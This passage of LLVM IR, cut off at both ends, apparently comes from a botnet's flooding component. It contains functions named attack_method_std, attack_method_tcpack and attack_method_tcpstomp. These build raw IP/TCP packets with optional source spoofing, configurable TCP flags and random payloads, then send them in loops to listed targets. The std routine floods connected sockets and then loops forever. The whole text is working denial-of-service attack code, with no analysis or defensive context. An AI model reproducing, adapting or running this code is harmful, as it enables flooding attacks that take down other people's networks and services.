; <label>:240:                                    ; preds = %238, %239
  %241 = getelementptr inbounds i8, i8* %231, i64 10
  %242 = bitcast i8* %241 to i16*
  store i16 0, i16* %242, align 2
  %243 = bitcast i8* %231 to i16*
  %244 = call zeroext i16 @checksum_generic(i16* %243, i32 20)
  store i16 %244, i16* %242, align 2
  %245 = load i32, i32* %5, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %246, i32 1
  %248 = load i32, i32* %247, align 4
  %249 = add i32 %248, 1
  store i32 %249, i32* %247, align 4
  %250 = trunc i32 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #12
  %252 = zext i16 %251 to i32
  %253 = getelementptr inbounds i8, i8* %231, i64 24
  %254 = bitcast i8* %253 to i32*
  store i32 %252, i32* %254, align 4
  %255 = load i32, i32* %5, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %256, i32 2
  %258 = load i32, i32* %257, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #12
  %261 = zext i16 %260 to i32
  %262 = getelementptr inbounds i8, i8* %231, i64 28
  %263 = bitcast i8* %262 to i32*
  store i32 %261, i32* %263, align 4
  %264 = getelementptr inbounds i8, i8* %231, i64 36
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 4
  %266 = call zeroext i16 @htons(i16 zeroext %91) #12
  %267 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %232, i8* %233, i16 zeroext %266, i32 %92)
  store i16 %267, i16* %265, align 4
  %268 = getelementptr inbounds i8, i8* %231, i64 22
  %269 = bitcast i8* %268 to i16*
  %270 = load i16, i16* %269, align 2
  %271 = load i32, i32* %5, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %270, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %231, i64 %93, i32 16384, %struct.sockaddr* %275, i32 16) #11
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph, label %.loopexit.loopexit

.loopexit150.loopexit:                            ; preds = %114
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %4, %81
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #12
  %57 = call i32 @htonl(i32 %56) #12
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %.160 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.160 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %65)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %34, i32 16384) #11
  %74 = add nsw i32 %.160, 1
  %75 = icmp slt i32 %74, %24
  %brmerge = or i1 %75, %33
  %.mux = select i1 %75, i32 %74, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %70
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %201, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  br label %88

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #11
  br label %201

.preheader.loopexit:                              ; preds = %135
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i8 %0, 0
  %73 = icmp eq i32 %39, -1
  %74 = and i32 %11, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = and i32 %17, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = and i32 %19, 65535
  %79 = icmp eq i32 %78, 65535
  %80 = icmp eq i32 %21, 65535
  %81 = icmp eq i32 %22, 65535
  %82 = icmp eq i8 %37, 0
  %83 = sext i32 %35 to i64
  %84 = add nsw i64 %83, 20
  %85 = trunc i64 %84 to i16
  %86 = trunc i64 %84 to i32
  %87 = add nsw i64 %83, 40
  br label %.loopexit

; <label>:88:                                     ; preds = %.lr.ph129, %135
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %8, i64 %91
  store i8* %89, i8** %92, align 8
  %93 = getelementptr inbounds i8, i8* %89, i64 20
  %94 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %95, align 1
  %96 = call zeroext i16 @htons(i16 zeroext %49) #12
  %97 = getelementptr inbounds i8, i8* %89, i64 2
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %12) #12
  %100 = getelementptr inbounds i8, i8* %89, i64 4
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 4
  %102 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %102, align 4
  br i1 %50, label %107, label %103

; <label>:103:                                    ; preds = %88
  %104 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %105 = getelementptr inbounds i8, i8* %89, i64 6
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %88, %103
  %108 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %108, align 1
  %109 = getelementptr inbounds i8, i8* %89, i64 12
  %110 = bitcast i8* %109 to i32*
  store i32 %39, i32* %110, align 4
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %112, i32 1
  %114 = load i32, i32* %113, align 4
  %115 = getelementptr inbounds i8, i8* %89, i64 16
  %116 = bitcast i8* %115 to i32*
  store i32 %114, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %18) #12
  %118 = bitcast i8* %93 to i16*
  store i16 %117, i16* %118, align 4
  %119 = call zeroext i16 @htons(i16 zeroext %20) #12
  %120 = getelementptr inbounds i8, i8* %89, i64 22
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %51) #12
  %123 = zext i16 %122 to i32
  %124 = getelementptr inbounds i8, i8* %89, i64 24
  %125 = bitcast i8* %124 to i32*
  store i32 %123, i32* %125, align 4
  %126 = getelementptr inbounds i8, i8* %89, i64 32
  %127 = bitcast i8* %126 to i16*
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -16369
  %130 = or i16 %68, %129
  %131 = or i16 %130, 80
  store i16 %131, i16* %127, align 4
  br i1 %69, label %135, label %132

; <label>:132:                                    ; preds = %107
  %133 = load i16, i16* %127, align 4
  %134 = or i16 %133, 2048
  store i16 %134, i16* %127, align 4
  br label %135

; <label>:135:                                    ; preds = %107, %132
  call void @rand_str(i8* nonnull %94, i32 %35)
  %136 = load i32, i32* %5, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %5, align 4
  %138 = icmp slt i32 %137, %46
  br i1 %138, label %88, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %180
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %72, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %180
  %storemerge121128 = phi i32 [ %199, %180 ], [ 0, %.lr.ph.preheader ]
  %139 = sext i32 %storemerge121128 to i64
  %140 = getelementptr inbounds i8*, i8** %8, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  %143 = getelementptr inbounds i8, i8* %141, i64 20
  %144 = getelementptr inbounds i8, i8* %141, i64 40
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = icmp ult i8 %146, 32
  br i1 %147, label %148, label %155

; <label>:148:                                    ; preds = %.lr.ph
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @ntohl(i32 %150) #12
  %152 = call i32 @htonl(i32 %151) #12
  %153 = getelementptr inbounds i8, i8* %141, i64 16
  %154 = bitcast i8* %153 to i32*
  store i32 %152, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %148, %.lr.ph
  br i1 %73, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %141, i64 12
  %158 = bitcast i8* %157 to i32*
  store i32 0, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %75, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %141, i64 4
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %166

; <label>:164:                                    ; preds = %163
  %165 = bitcast i8* %143 to i16*
  store i16 0, i16* %165, align 4
  br label %166

; <label>:166:                                    ; preds = %164, %163
  br i1 %79, label %167, label %170

; <label>:167:                                    ; preds = %166
  %168 = getelementptr inbounds i8, i8* %141, i64 22
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  br label %170

; <label>:170:                                    ; preds = %167, %166
  br i1 %80, label %171, label %174

; <label>:171:                                    ; preds = %170
  %172 = getelementptr inbounds i8, i8* %141, i64 24
  %173 = bitcast i8* %172 to i32*
  store i32 0, i32* %173, align 4
  br label %174

; <label>:174:                                    ; preds = %171, %170
  br i1 %81, label %175, label %178

; <label>:175:                                    ; preds = %174
  %176 = getelementptr inbounds i8, i8* %141, i64 28
  %177 = bitcast i8* %176 to i32*
  store i32 0, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %175, %174
  br i1 %82, label %180, label %179

; <label>:179:                                    ; preds = %178
  call void @rand_str(i8* %144, i32 %35)
  br label %180

; <label>:180:                                    ; preds = %178, %179
  %181 = getelementptr inbounds i8, i8* %141, i64 10
  %182 = bitcast i8* %181 to i16*
  store i16 0, i16* %182, align 2
  %183 = bitcast i8* %141 to i16*
  %184 = call zeroext i16 @checksum_generic(i16* %183, i32 20)
  store i16 %184, i16* %182, align 2
  %185 = getelementptr inbounds i8, i8* %141, i64 36
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  %187 = call zeroext i16 @htons(i16 zeroext %85) #12
  %188 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %142, i8* %143, i16 zeroext %187, i32 %86)
  store i16 %188, i16* %186, align 4
  %189 = getelementptr inbounds i8, i8* %141, i64 22
  %190 = bitcast i8* %189 to i16*
  %191 = load i16, i16* %190, align 2
  %192 = load i32, i32* %5, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0, i32 1
  store i16 %191, i16* %194, align 2
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %193, i32 0
  %196 = bitcast %struct.sockaddr_in* %195 to %struct.sockaddr*
  %197 = call i64 @sendto(i32 %40, i8* %141, i64 %87, i32 16384, %struct.sockaddr* %196, i32 16) #11
  %198 = load i32, i32* %5, align 4
  %199 = add nsw i32 %198, 1
  store i32 %199, i32* %5, align 4
  %200 = icmp slt i32 %199, %46
  br i1 %200, label %.lr.ph, label %.loopexit.loopexit

; <label>:201:                                    ; preds = %4, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %81, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.preheader151.lr.ph

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  br label %.preheader151

; <label>:81:                                     ; preds = %42
  %82 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %83 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %.loopexit152, label %.lr.ph161.preheader

.lr.ph161.preheader:                              ; preds = %.preheader151
  br label %.lr.ph161

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153
  %85 = icmp eq i8 %0, 0
  %86 = and i32 %17, 65535
  %87 = icmp eq i32 %86, 65535
  %88 = icmp eq i8 %39, 0
  %89 = sext i32 %37 to i64
  %90 = add nsw i64 %89, 20
  %91 = trunc i64 %90 to i16
  %92 = trunc i64 %90 to i32
  %93 = add nsw i64 %89, 40
  br label %.loopexit

.lr.ph161:                                        ; preds = %.lr.ph161.preheader, %.backedge
  %94 = phi i32 [ %218, %.backedge ], [ %83, %.lr.ph161.preheader ]
  %95 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 3, i32 0) #11
  %96 = or i32 %95, 2048
  %97 = call i32 (i32, i32, ...) @fcntl(i32 %94, i32 4, i32 %96) #11
  store i16 2, i16* %48, align 4
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 2
  %101 = load i8, i8* %100, align 4
  %102 = icmp ult i8 %101, 32
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %99, i32 1
  %104 = load i32, i32* %103, align 4
  br i1 %102, label %105, label %108

; <label>:105:                                    ; preds = %.lr.ph161
  %106 = call i32 @ntohl(i32 %104) #12
  %107 = call i32 @htonl(i32 %106) #12
  br label %108

; <label>:108:                                    ; preds = %.lr.ph161, %105
  %.sink = phi i32 [ %107, %105 ], [ %104, %.lr.ph161 ]
  store i32 %.sink, i32* %49, align 4
  br i1 %51, label %111, label %109

; <label>:109:                                    ; preds = %108
  %110 = call zeroext i16 @htons(i16 zeroext %24) #12
  br label %111

; <label>:111:                                    ; preds = %108, %109
  %.sink3 = phi i16 [ %110, %109 ], [ 0, %108 ]
  store i16 %.sink3, i16* %52, align 2
  %112 = call i32 @connect(i32 %94, %struct.sockaddr* nonnull %53, i32 16) #11
  %113 = call i64 @time(i64* null) #11
  br label %114

; <label>:114:                                    ; preds = %220, %111
  store i32 16, i32* %8, align 4
